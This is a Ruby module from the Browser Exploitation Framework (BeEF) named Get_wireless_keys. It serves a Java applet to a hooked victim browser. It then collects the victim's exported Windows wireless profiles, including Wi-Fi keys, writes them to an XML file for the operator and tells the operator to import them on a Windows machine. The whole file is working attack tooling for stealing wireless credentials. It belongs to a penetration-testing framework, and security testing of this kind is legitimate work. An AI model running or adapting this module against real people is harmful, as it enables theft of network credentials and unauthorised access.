#
# Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_wireless_keys < BeEF::Core::Command
  
	def pre_send
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_wireless_keys/wirelessZeroConfig.jar','/wirelessZeroConfig','jar')
	end
  
	def post_execute
		content = {}
		content['result'] = @datastore['result'].to_s
		save content
		filename = "#{$home_dir}/exported_wlan_profiles_#{ip}_-_#{timestamp}_#{@datastore['cid']}.xml"
		f = File.open(filename,"w+")
		f.write((@datastore['results']).sub("result=",""))
		writeToResults = Hash.new
		writeToResults['data'] = "Please import #{filename} into your windows machine"
		BeEF::Core::Models::Command.save_result(@datastore['beefhook'], @datastore['cid'] , @friendlyname, writeToResults, 0)
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/wirelessZeroConfig.jar')
	end
  
end

